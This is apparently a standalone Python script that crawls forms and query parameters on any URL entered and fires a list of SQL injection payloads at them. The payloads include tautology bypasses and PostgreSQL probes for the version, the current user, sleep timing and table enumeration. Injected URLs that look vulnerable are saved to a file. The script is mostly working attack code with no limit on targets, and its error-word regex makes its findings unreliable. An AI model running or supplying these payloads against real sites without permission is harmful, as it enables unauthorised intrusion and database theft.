import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re

# Extended SQL Injection Payloads
sql_payloads = [
    # Generic Payloads
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' ({",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "' OR ''='",
    "' OR 1=1#",
    "' OR '1'='1' /*",
    # MySQL Specific Payloads
    "' OR '1'='1' /*",
    "' OR 1=1 LIMIT 1 --",
    "' OR 1=1 LIMIT 1 /*",
    "1 OR 1=1",
    "1' OR 1=1 --",
    "1' OR '1'='1 --",
    "1' OR '1'='1 /*",
    "' OR 1=1 LIMIT 1; --",
    # PostgreSQL Specific Payloads
    "'; SELECT version(); --",
    "'; SELECT pg_sleep(5); --",
    "'; SELECT user; --",
    "'; SELECT current_database(); --",
    "'; SELECT table_schema,table_name FROM information_schema.tables; --",
]

def get_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    return soup.find_all('form')

def extract_params(url):
    parsed_url = urlparse(url)
    return parse_qs(parsed_url.query)

def submit_form(form, url, payload):
    action = form.get('action')
    method = form.get('method', 'get').lower()
    inputs = form.find_all(['input', 'textarea', 'select'])

    data = {}
    for input_tag in inputs:
        name = input_tag.get('name')
        if name:
            data[name] = payload if input_tag.get('type') in ['text', 'search', 'url', 'email', 'tel', 'number', 'textarea'] else input_tag.get('value')

    target_url = urljoin(url, action)

    if method == 'post':
        return requests.post(target_url, data=data), target_url, data
    else:
        return requests.get(target_url, params=data), target_url, data

def scan_sql_injection(url):
    print("Scanning in progress, please wait...")
    forms = get_forms(url)
    initial_params = extract_params(url)

    for form in forms:
        for payload in sql_payloads:
            response, target_url, data = submit_form(form, url, payload)
            try:
                content = response.content.decode('utf-8', errors='ignore')
            except UnicodeDecodeError:
                content = response.content.decode('latin1', errors='ignore')
            if re.search(r"error|syntax|warning|exception|unknown", content, re.IGNORECASE):
                print(f"SQL Injection vulnerability detected with payload: {payload}")
                print(f"Form details: {form}")
                print(f"Injected URL: {target_url}?{urlencode(data)}")
                with open("vulnerable_urls.txt", "a") as file:
                    file.write(f"{target_url}?{urlencode(data)}\n")
                print("vulnerable_urls.txt has been updated with the detected vulnerability.")
                return True

    for param in initial_params:
        for payload in sql_payloads:
            test_params = initial_params.copy()
            test_params[param] = payload
            response = requests.get(url, params=test_params)
            try:
                content = response.content.decode('utf-8', errors='ignore')
            except UnicodeDecodeError:
                content = response.content.decode('latin1', errors='ignore')
            if re.search(r"error|syntax|warning|exception|unknown", content, re.IGNORECASE):
                print(f"SQL Injection vulnerability detected in URL parameter '{param}' with payload: {payload}")
                injected_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}{urlparse(url).path}?{urlencode(test_params)}"
                print(f"Injected URL: {injected_url}")
                with open("vulnerable_urls.txt", "a") as file:
                    file.write(f"{injected_url}\n")
                print("vulnerable_urls.txt has been updated with the detected vulnerability.")
                return True

    print("No SQL Injection vulnerability detected.")
    return False

def main():
    url = input("Enter URL to scan for SQL Injection: ")
    scan_sql_injection(url)

if __name__ == "__main__":
    main()
